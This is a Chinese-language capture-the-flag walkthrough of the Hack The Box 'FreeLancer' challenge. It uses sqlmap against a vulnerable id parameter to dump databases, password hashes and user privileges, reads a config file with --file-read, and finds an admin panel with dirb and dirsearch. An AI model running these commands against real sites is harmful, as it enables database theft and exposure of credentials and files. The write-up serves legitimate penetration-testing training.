**0x00:靶场概况**

这次的环境是Hack the box challenge的FreeLancer。目前challenge是可以免费玩的。只需要注册一个Hack the box账号即可。**这次的FreeLancer需要掌握的技术有sqlmap的工具使用以及目录扫描器的尝试。**

  

  

  

![](../Images/ed05673e98f0accbee30b4e22685fef8.png)

**0x01:漏洞挖掘**

  

点击Start Instance以后会给出一个IP地址点进去以后是一个正常的页面可以随便到处看看，不过功能点比较少

  

  

![](../Images/98ff60cb49ae0203c8e6788afe436538.png)

  

顺便按住F12或者是右击检查波页面源代码逐层点开以后发现有个**portfoli.php?id=1的href链接**

  

  

![](../Images/5bea80a766e0985cc2d5a7107958a5b1.png)

  

跟进一波页面可以正常回显同时是个/id=1的参数

  

  

![](../Images/0e436809a2acd28be97d3cfc520a3405.png)

  

  

**0x02:sqlmap的使用**

遇到?id=1我们可以使用sqlmap看看能不能挖掘到SQL注入

命令:sqlmap -u URL地址 –-batch(自动填充内容) –level 3(强度)

  

  

![](../Images/cb26030365d382095a25909c051ebd2d.png)

  

等了一会如果出现**Parameter**就是代表注入成功了

  

  

![](../Images/64fc7c36416e828947e1f22457ceac2f.png)

  

接下来输入—dbs查看波数据库 这里选择freelancer

命令: sqlmap -u URL地址 –-batch(自动填充内容) –level 3(强度) –dbs(列出数据库出来)

  

  

![](../Images/eaf8b8daac68b18432fb6d15886667ca.png)

  

接下来继续深入挖掘数据选择波safeadmin表

命令:sqlmap -u URL地址 –-batch(自动填充内容) –level 3(强度) –dbs(列出数据库出来) -D safeadmin(指定表)

  

  

![](../Images/3561b6d5aecc8e149106a50fe876d91d.png)  

  

这里我直接跑里面的数据了可以看到一个账号和密码但是都无法解密出来卒

命令: sqlmap -u URL地址 –-batch(自动填充内容) –level 3(强度) –dbs(列出数据库出来) -D safeadmin(指定表) –dump(跑数据)

  

  

  

![](../Images/3253622c01b63847c1659b752dea5d7f.png)  

  

然后我们查看波当前用户，当前数据库用户,密码,当前的权限。看到有一个root跑出来可以猜测出这是一个linux系统。那么它存放的路径一般为/var/www/html ,同时往下拉可以看到**privilege有个FILE** 有可读文件的权限。我们可以尝试把源码拷贝下来等下。

命令: python sqlmap.py -u http://46.101.91.21:30251/portfolio.php?id=1 --current-user -current-db -users -passwords -privileges --batch

  

  

![](../Images/c4fa291516a79b10828d73dcc5e138b7.png)

  

  

**0x03:挖掘目录信息**

既然无法解密出safeadmin的密码出来改变策略看看能不能挖到后台出来,这里**使用kali的自带扫描器dirb**命令也很简单只需要dirb + URL就可这里我顺便选上/usr/share/dirb/wordlists/big.txt 大字典扫到一个**/administart**

  

  

![](../Images/1fca57eca9e5687714a60ed85809d521.png)  

  

跟进一波是个登录页面(这里IP变了是由于死机了重启了靶场一次)

  

  

![](../Images/2be227f330a2007599c1688ed1a1d7b7.png)  

  

这里我双扫描器跟进了dirsearch这边继续扫 /administrat下面的内容还有个/include

  

  

![](../Images/e937e28630e473da166bc7d70931df01.png)  

  

Dirb这边继续配合扫/include的内容扫到一个config.php。如果我们在前台输入的话会发现是空白页面

  

  

![](../Images/809ef5c37943bebef48c92c3fb55ef0b.png)  

  

那只好使用sqlmap使用—file-read功能把源码读出来看看有什么东西,结果只有个数据库密码。。。。

  

命令:sqlmap -u http://206.189.121.131:31237/portfolio.php?id=1 – file-read=/var/www/html/administrat/include/config.php

  

  

![](../Images/05383715c51db59ecf96a6d22104f0b1.png)  

  

改变方向这次把index.php看看登录框里面有什么

  

  

![](../Images/15ac35a987e4cfa8e404f410d7c3b090.png)  

发现还有一个panel.php

  

  

![](../Images/265d0a0dfacc9be67decf4274fe1c335.png)  

  

继续扫这次读到flag了。。。。
